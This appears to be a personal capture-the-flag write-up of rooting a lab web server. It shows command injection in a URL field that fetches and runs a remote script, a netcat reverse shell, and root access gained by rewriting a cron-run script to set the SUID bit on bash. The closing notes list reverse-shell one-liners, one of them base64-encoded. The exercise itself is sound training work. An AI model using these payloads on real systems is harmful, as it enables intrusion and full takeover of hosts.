
```nmap
kali@kali ~> nmap -sCV -Pn 10.10.227.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 15:28 EDT
Nmap scan report for 10.10.227.167
Host is up (0.61s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.14 seconds
```



```
POST / HTTP/1.1
Host: 10.10.227.167
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 56
Origin: http://10.10.227.167
Connection: close
Referer: http://10.10.227.167/
yt_url=`curl${IFS}http://10.8.11.58%3a8002/file.sh|bash`
```


![[ConvertMyVideo-20240316021330205.webp]]


we can see that we have command injection given by the `LC_ALL environment variable to fix this.\nERROR: u'uid=33(www-data)' is not a valid URL.`

so lets try  a different payload



# PrivEsc


```
$ chmod +x pspy64
$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/03/15 23:47:02 CMD: UID=33    PID=1833   | ./pspy64
2024/03/15 23:47:02 CMD: UID=0     PID=1823   |
2024/03/15 23:47:02 CMD: UID=0     PID=1783   |
2024/03/15 23:47:02 CMD: UID=0     PID=1574   |
2024/03/15 23:47:02 CMD: UID=33    PID=1497   | nc 10.8.11.58 6666
2024/03/15 23:47:02 CMD: UID=33    PID=1496   | sh -i
2024/03/15 23:47:02 CMD: UID=33    PID=1495   | cat /tmp/f
2024/03/15 23:47:02 CMD: UID=33    PID=1492   | bash
2024/03/15 23:47:02 CMD: UID=33    PID=1490   | sh -c youtube-dl --extract-audio --audio-format mp3 `curl${IFS}http://10.8.11.58:8002/file.sh|bash` -f 18 -o '/var/www/html/tmp/downloads/65f4d7c5d889c.%(ext)s'
2024/03/15 23:47:02 CMD: UID=33    PID=1489   | sh -c youtube-dl --extract-audio --audio-format mp3 `curl${IFS}http://10.8.11.58:8002/file.sh|bash` -f 18 -o '/var/www/html/tmp/downloads/65f4d7c5d889c.%(ext)s'
2024/03/15 23:47:02 CMD: UID=33    PID=1290   | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=1289   | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=1284   | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=1283   | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=886    | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=885    | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=884    | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=883    | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=33    PID=882    | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=0     PID=881    | /usr/sbin/apache2 -k start
2024/03/15 23:47:02 CMD: UID=0     PID=846    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
2024/03/15 23:47:02 CMD: UID=0     PID=838    | /sbin/agetty -o -p -- \u --noclear tty1 linux
2024/03/15 23:47:02 CMD: UID=0     PID=836    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
2024/03/15 23:47:02 CMD: UID=0     PID=824    | /usr/lib/policykit-1/polkitd --no-debug
2024/03/15 23:47:02 CMD: UID=0     PID=817    | /usr/sbin/sshd -D
2024/03/15 23:47:02 CMD: UID=0     PID=816    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
2024/03/15 23:47:02 CMD: UID=0     PID=813    | /lib/systemd/systemd-logind
2024/03/15 23:47:02 CMD: UID=103   PID=772    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
2024/03/15 23:47:02 CMD: UID=0     PID=762    | /usr/lib/accountsservice/accounts-daemon
2024/03/15 23:47:02 CMD: UID=0     PID=761    | /usr/bin/lxcfs /var/lib/lxcfs/
2024/03/15 23:47:02 CMD: UID=102   PID=759    | /usr/sbin/rsyslogd -n
2024/03/15 23:47:02 CMD: UID=0     PID=755    | /usr/lib/snapd/snapd
2024/03/15 23:47:02 CMD: UID=0     PID=751    | /usr/sbin/cron -f
2024/03/15 23:47:02 CMD: UID=1     PID=750    | /usr/sbin/atd -f
2024/03/15 23:47:02 CMD: UID=101   PID=674    | /lib/systemd/systemd-resolved
2024/03/15 23:47:02 CMD: UID=100   PID=657    | /lib/systemd/systemd-networkd
2024/03/15 23:47:02 CMD: UID=62583 PID=458    | /lib/systemd/systemd-timesyncd
2024/03/15 23:47:02 CMD: UID=0     PID=436    |
2024/03/15 23:47:02 CMD: UID=0     PID=414    | /lib/systemd/systemd-udevd
2024/03/15 23:47:02 CMD: UID=0     PID=413    |
2024/03/15 23:47:02 CMD: UID=0     PID=412    |
2024/03/15 23:47:02 CMD: UID=0     PID=407    | /sbin/lvmetad -f
2024/03/15 23:47:02 CMD: UID=0     PID=406    |
2024/03/15 23:47:02 CMD: UID=0     PID=405    |
2024/03/15 23:47:02 CMD: UID=0     PID=404    |
2024/03/15 23:47:02 CMD: UID=0     PID=403    |
2024/03/15 23:47:02 CMD: UID=0     PID=399    |
2024/03/15 23:47:02 CMD: UID=0     PID=379    | /lib/systemd/systemd-journald
2024/03/15 23:47:02 CMD: UID=0     PID=318    |
2024/03/15 23:47:02 CMD: UID=0     PID=317    |
2024/03/15 23:47:02 CMD: UID=0     PID=263    |
2024/03/15 23:47:02 CMD: UID=0     PID=176    |
2024/03/15 23:47:02 CMD: UID=0     PID=155    |
2024/03/15 23:47:02 CMD: UID=0     PID=116    |
2024/03/15 23:47:02 CMD: UID=0     PID=99     |
2024/03/15 23:47:02 CMD: UID=0     PID=90     |
2024/03/15 23:47:02 CMD: UID=0     PID=84     |
2024/03/15 23:47:02 CMD: UID=0     PID=83     |
2024/03/15 23:47:02 CMD: UID=0     PID=82     |
2024/03/15 23:47:02 CMD: UID=0     PID=81     |
2024/03/15 23:47:02 CMD: UID=0     PID=80     |
2024/03/15 23:47:02 CMD: UID=0     PID=79     |
2024/03/15 23:47:02 CMD: UID=0     PID=37     |
2024/03/15 23:47:02 CMD: UID=0     PID=36     |
2024/03/15 23:47:02 CMD: UID=0     PID=35     |
2024/03/15 23:47:02 CMD: UID=0     PID=32     |
2024/03/15 23:47:02 CMD: UID=0     PID=31     |
2024/03/15 23:47:02 CMD: UID=0     PID=30     |
2024/03/15 23:47:02 CMD: UID=0     PID=29     |
2024/03/15 23:47:02 CMD: UID=0     PID=28     |
2024/03/15 23:47:02 CMD: UID=0     PID=27     |
2024/03/15 23:47:02 CMD: UID=0     PID=26     |
2024/03/15 23:47:02 CMD: UID=0     PID=25     |
2024/03/15 23:47:02 CMD: UID=0     PID=24     |
2024/03/15 23:47:02 CMD: UID=0     PID=23     |
2024/03/15 23:47:02 CMD: UID=0     PID=22     |
2024/03/15 23:47:02 CMD: UID=0     PID=21     |
2024/03/15 23:47:02 CMD: UID=0     PID=20     |
2024/03/15 23:47:02 CMD: UID=0     PID=19     |
2024/03/15 23:47:02 CMD: UID=0     PID=18     |
2024/03/15 23:47:02 CMD: UID=0     PID=17     |
2024/03/15 23:47:02 CMD: UID=0     PID=16     |
2024/03/15 23:47:02 CMD: UID=0     PID=15     |
2024/03/15 23:47:02 CMD: UID=0     PID=14     |
2024/03/15 23:47:02 CMD: UID=0     PID=13     |
2024/03/15 23:47:02 CMD: UID=0     PID=12     |
2024/03/15 23:47:02 CMD: UID=0     PID=11     |
2024/03/15 23:47:02 CMD: UID=0     PID=10     |
2024/03/15 23:47:02 CMD: UID=0     PID=9      |
2024/03/15 23:47:02 CMD: UID=0     PID=8      |
2024/03/15 23:47:02 CMD: UID=0     PID=7      |
2024/03/15 23:47:02 CMD: UID=0     PID=6      |
2024/03/15 23:47:02 CMD: UID=0     PID=4      |
2024/03/15 23:47:02 CMD: UID=0     PID=2      |
2024/03/15 23:47:02 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity
2024/03/15 23:48:01 CMD: UID=0     PID=1848   | bash /var/www/html/tmp/clean.sh
2024/03/15 23:48:01 CMD: UID=0     PID=1847   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh
2024/03/15 23:48:01 CMD: UID=0     PID=1846   | /usr/sbin/CRON -f
2024/03/15 23:48:01 CMD: UID=0     PID=1849   | chmod u+s /bin/bash


```

```
kali@kali ~> nc -nvlp 6666
listening on [any] 6666 ...
10.10.5.56 - - [15/Mar/2024 19:20:43] "GET /file.sh HTTP/1.1" 200 -
connect to [10.8.11.58] from (UNKNOWN) [10.10.5.56] 58538
sh: 0: can't access tty; job control turned off
$ ls -la
total 36
drwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 3 root     root     4096 Apr 12  2020 ..
-rw-r--r-- 1 www-data www-data  152 Apr 12  2020 .htaccess
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 admin
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 images
-rw-r--r-- 1 www-data www-data 1790 Apr 12  2020 index.php
drwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 js
-rw-rw-r-- 1 www-data www-data  205 Apr 12  2020 style.css
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 tmp
$ cd tmp
$ ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .
drwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 ..
-rw-r--r-- 1 www-data www-data   17 Apr 12  2020 clean.sh
$ cat clean.sh
rm -rf downloads

```


Basically just dirty dog this fucking bitch

```
$ echo 'chmod u+s /bin/bash' > clean.sh
$ ls -lah /bin/bash
-rwxr-xr-x 1 root root 1.1M Jun  6  2019 /bin/bash
$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.1M Jun  6  2019 /bin/bash
$ /bin/bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
root
cd /root
cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}

```

--- 

# Mistakes


# Foothold

1. not mistake but actually listened, read the syntax errors and determine what it is from there.
2. Always double check
	1. Never EVER use only `ls` for command injection always use `id` or `pwd`
3. Note a mistake just notes when wanting to do a reverse shell and you have RCE remember the tride and true
	1. `curl http://10.10.10.5:8002/shell.sh|bash` 
	2. `echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAvOTAwMSAwPiYxCg==' | base64 -d | bash`

